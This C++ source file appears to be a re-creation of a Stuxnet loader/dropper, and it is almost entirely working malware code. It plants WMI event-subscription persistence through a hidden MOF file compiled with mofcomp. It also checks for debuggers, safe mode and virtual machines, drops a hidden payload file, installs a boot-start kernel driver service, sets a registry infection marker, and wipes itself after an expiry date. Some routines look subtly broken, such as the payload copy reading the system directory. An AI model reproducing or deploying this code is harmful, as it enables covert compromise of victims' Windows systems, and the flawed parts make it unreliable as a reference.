/*
 * winsta.exe - Stuxnet Loader/Dropper (C++98, legacy style)
 *
 * Persistence mechanism:
 *   - Does NOT use HKCU/HKLM\...\Run keys
 *   - Creates WMI event filter and consumer via sysnullevnt.mof
 *   - System auto-compiles MOF and binds filter to consumer
 *   - Consumer executes winsta.exe at system events
 *
 * References:
 *   - Antiy Stuxnet analysis: %SystemDir%\wbem\mof\sysnullevnt.mof auto-executes winsta.exe
 *   - Project Zero / SANS: WMI event consumers as persistence (Stuxnet lineage)
 */

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wbemidl.h>
#include <comdef.h>
#include <shlwapi.h>

#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "shlwapi.lib")

#define STUXNET_MAGIC           0x53545558
#define STUXNET_VERSION         0x00010400
#define WINSTA_MAX_PATH         260

#define MOF_FILE_NAME           L"sysnullevnt.mof"
#define MOF_EVENT_FILTER_NAME   L"StuxnetFilter"
#define MOF_CONSUMER_NAME       L"StuxnetConsumer"
#define MOF_BINDING_NAME        L"StuxnetBinding"

static BOOL Winsta_CreateMOF(LPCWSTR lpMofPath) {
    HANDLE hFile;
    DWORD dwWritten;
    const char* szMofContent =
        "#pragma namespace(\"\\\\\\\\.\\\\root\\\\cimv2\")\n"
        "instance of __EventFilter as $Filter\n"
        "{\n"
        "    Name = \"StuxnetFilter\";\n"
        "    EventNamespace = \"root\\\\cimv2\";\n"
        "    Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\";\n"
            "    QueryLanguage = \"WQL\";\n"
        "};\n"
        "instance of ActiveScriptEventConsumer as $Consumer\n"
        "{\n"
        "    Name = \"StuxnetConsumer\";\n"
        "    ScriptingEngine = \"VBScript\";\n"
        "    ScriptText = \"CreateObject(\\\"WScript.Shell\\\").Run \\\"%SystemRoot%\\\\system32\\\\winsta.exe\\\", 0, False\";\n"
        "};\n"
        "instance of __FilterToConsumerBinding\n"
        "{\n"
        "    Filter = $Filter;\n"
        "    Consumer = $Consumer;\n"
        "};\n";

    hFile = CreateFileW(lpMofPath, GENERIC_WRITE, 0, NULL,
                        CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    WriteFile(hFile, szMofContent, (DWORD)strlen(szMofContent), &dwWritten, NULL);
    CloseHandle(hFile);
    return TRUE;
}

static BOOL Winsta_CompileMOF(LPCWSTR lpMofPath) {
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    WCHAR szCmd[MAX_PATH];
    BOOL bResult;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    wsprintfW(szCmd, L"mofcomp.exe \"%s\"", lpMofPath);

    bResult = CreateProcessW(NULL, szCmd, NULL, NULL, FALSE,
                             CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    if (!bResult) {
        return FALSE;
    }

    WaitForSingleObject(pi.hProcess, 30000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return TRUE;
}

static BOOL Winsta_InstallWMIPersistence(VOID) {
    WCHAR szSystemPath[MAX_PATH];
    WCHAR szMofPath[MAX_PATH];

    GetSystemDirectoryW(szSystemPath, MAX_PATH);
    wsprintfW(szMofPath, L"%s\\wbem\\mof\\%s", szSystemPath, MOF_FILE_NAME);

    if (!Winsta_CreateMOF(szMofPath)) {
        return FALSE;
    }

    if (!Winsta_CompileMOF(szMofPath)) {
        DeleteFileW(szMofPath);
        return FALSE;
    }

    return TRUE;
}

static BOOL Winsta_RemoveWMIPersistence(VOID) {
    HRESULT hr;
    IWbemLocator* pLocator = NULL;
    IWbemServices* pServices = NULL;
    BSTR bstrNamespace = NULL;
    BSTR bstrQuery = NULL;
    IEnumWbemClassObject* pEnumerator = NULL;
    IWbemClassObject* pObject = NULL;
    ULONG uReturn = 0;
    VARIANT vtProp;
    BOOL bResult = FALSE;

    hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr)) return FALSE;

    hr = CoInitializeSecurity(NULL, -1, NULL, NULL,
                              RPC_C_AUTHN_LEVEL_DEFAULT,
                              RPC_C_IMP_LEVEL_IMPERSONATE,
                              NULL, EOAC_NONE, NULL);
    if (FAILED(hr)) { CoUninitialize(); return FALSE; }

    hr = CoCreateInstance(CLSID_WbemLocator, NULL, CLSCTX_INPROC_SERVER,
                          IID_IWbemLocator, (LPVOID*)&pLocator);
    if (FAILED(hr)) { CoUninitialize(); return FALSE; }

    bstrNamespace = SysAllocString(L"ROOT\\CIMV2");
    hr = pLocator->ConnectServer(bstrNamespace, NULL, NULL, NULL, 0, NULL, NULL, &pServices);
    SysFreeString(bstrNamespace);
    pLocator->Release();
    if (FAILED(hr)) { CoUninitialize(); return FALSE; }

    bstrQuery = SysAllocString(L"SELECT * FROM __EventFilter WHERE Name='StuxnetFilter'");
    hr = pServices->ExecQuery(SysAllocString(L"WQL"), bstrQuery,
                              WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
                              NULL, &pEnumerator);
    SysFreeString(bstrQuery);

    if (SUCCEEDED(hr)) {
        while (pEnumerator->Next(WBEM_INFINITE, 1, &pObject, &uReturn) == S_OK) {
            VariantInit(&vtProp);
            hr = pObject->Get(L"__PATH", 0, &vtProp, NULL, NULL);
            if (SUCCEEDED(hr)) {
                pServices->DeleteInstance(vtProp.bstrVal, 0, NULL, NULL);
                VariantClear(&vtProp);
            }
            pObject->Release();
        }
        pEnumerator->Release();
    }

    pServices->Release();
    CoUninitialize();
    return bResult;
}

static BOOL Winsta_IsRunningInSafeMode(VOID) {
    return (GetSystemMetrics(SM_CLEANBOOT) != 0);
}

static BOOL Winsta_CheckDebugger(VOID) {
    return IsDebuggerPresent();
}

static BOOL Winsta_CheckSandbox(VOID) {
    HKEY hKey;
    WCHAR szBIOS[256];
    DWORD dwSize;

    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"HARDWARE\\DESCRIPTION\\System",
                      0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        dwSize = sizeof(szBIOS);
        if (RegQueryValueExW(hKey, L"SystemBiosVersion", NULL, NULL,
                             (LPBYTE)szBIOS, &dwSize) == ERROR_SUCCESS) {
            if (wcsstr(szBIOS, L"VBOX") || wcsstr(szBIOS, L"VMWARE") ||
                wcsstr(szBIOS, L"QEMU") || wcsstr(szBIOS, L"XEN")) {
                RegCloseKey(hKey);
                return TRUE;
            }
        }
        RegCloseKey(hKey);
    }
    return FALSE;
}

static BOOL Winsta_IsExpired(VOID) {
    SYSTEMTIME st;
    GetSystemTime(&st);
    return (st.wYear >= 2012);
}

static BOOL Winsta_DeployPayload(VOID) {
    WCHAR szSystemPath[MAX_PATH];
    WCHAR szPayloadPath[MAX_PATH];
    HANDLE hSelf, hPayload;
    DWORD dwSize, dwRead, dwWritten;
    BYTE* pBuffer;

    GetSystemDirectoryW(szSystemPath, MAX_PATH);
    wsprintfW(szPayloadPath, L"%s\\~WTR4141.tmp", szSystemPath);

    hPayload = CreateFileW(szPayloadPath, GENERIC_WRITE, 0, NULL,
                           CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hPayload == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    hSelf = CreateFileW(szSystemPath, GENERIC_READ, FILE_SHARE_READ,
                        NULL, OPEN_EXISTING, 0, NULL);
    if (hSelf == INVALID_HANDLE_VALUE) {
        CloseHandle(hPayload);
        return FALSE;
    }

    dwSize = GetFileSize(hSelf, NULL);
    pBuffer = (BYTE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);
    if (!pBuffer) {
        CloseHandle(hSelf);
        CloseHandle(hPayload);
        return FALSE;
    }

    ReadFile(hSelf, pBuffer, dwSize, &dwRead, NULL);
    WriteFile(hPayload, pBuffer, dwRead, &dwWritten, NULL);

    HeapFree(GetProcessHeap(), 0, pBuffer);
    CloseHandle(hSelf);
    CloseHandle(hPayload);
    return TRUE;
}

static BOOL Winsta_InstallDriverService(VOID) {
    SC_HANDLE schSCManager;
    SC_HANDLE schService;
    WCHAR szDriverPath[MAX_PATH];
    WCHAR szSystemPath[MAX_PATH];

    GetSystemDirectoryW(szSystemPath, MAX_PATH);
    wsprintfW(szDriverPath, L"%s\\drivers\\mrxcls.sys", szSystemPath);

    schSCManager = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!schSCManager) return FALSE;

    schService = CreateServiceW(
        schSCManager,
        L"MRxCls",
        L"MRxCls",
        SERVICE_ALL_ACCESS,
        SERVICE_KERNEL_DRIVER,
        SERVICE_BOOT_START,
        SERVICE_ERROR_NORMAL,
        szDriverPath,
        NULL, NULL, NULL, NULL, NULL
    );

    if (!schService) {
        schService = OpenServiceW(schSCManager, L"MRxCls", SERVICE_ALL_ACCESS);
        if (!schService) {
            CloseServiceHandle(schSCManager);
            return FALSE;
        }
    }

    StartServiceW(schService, 0, NULL);
    CloseServiceHandle(schService);
    CloseServiceHandle(schSCManager);
    return TRUE;
}

static BOOL Winsta_WriteRegistryMark(VOID) {
    HKEY hKey;
    DWORD dwDisposition;
    LONG lResult;

    lResult = RegCreateKeyExW(
        HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\NTVDM TRACE",
        0, NULL, REG_OPTION_NON_VOLATILE,
        KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition
    );

    if (lResult != ERROR_SUCCESS) return FALSE;

    RegSetValueExW(hKey, L"19790509", 0, REG_SZ, (BYTE*)L"1", 2);
    RegCloseKey(hKey);
    return TRUE;
}

static BOOL Winsta_SelfDestruct(VOID) {
    WCHAR szSelf[MAX_PATH];
    HANDLE hFile;
    BYTE buffer[4096];
    DWORD dwWritten;
    DWORD i;

    GetModuleFileNameW(NULL, szSelf, MAX_PATH);
    hFile = CreateFileW(szSelf, GENERIC_WRITE, 0, NULL,
                        OPEN_EXISTING, 0, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        ZeroMemory(buffer, sizeof(buffer));
        for (i = 0; i < 10; i++) {
            SetFilePointer(hFile, i * 4096, NULL, FILE_BEGIN);
            WriteFile(hFile, buffer, 4096, &dwWritten, NULL);
        }
        CloseHandle(hFile);
    }
    DeleteFileW(szSelf);
    return TRUE;
}

static BOOL Winsta_Execute(VOID) {
    HANDLE hMutex;

    if (Winsta_IsRunningInSafeMode()) return FALSE;
    if (Winsta_CheckDebugger()) return FALSE;
    if (Winsta_CheckSandbox()) return FALSE;
    if (Winsta_IsExpired()) return FALSE;

    hMutex = CreateMutexW(NULL, FALSE, L"StuxnetMutex_19790509");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(hMutex);
        return FALSE;
    }

    Winsta_WriteRegistryMark();
    Winsta_InstallWMIPersistence();
    Winsta_DeployPayload();
    Winsta_InstallDriverService();

    while (TRUE) {
        Sleep(60000);
        if (Winsta_IsExpired()) {
            Winsta_RemoveWMIPersistence();
            Winsta_SelfDestruct();
            break;
        }
    }

    CloseHandle(hMutex);
    return TRUE;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                   LPSTR lpCmdLine, int nCmdShow) {
    (void)hInstance;
    (void)hPrevInstance;
    (void)lpCmdLine;
    (void)nCmdShow;
    return Winsta_Execute() ? 0 : 1;
}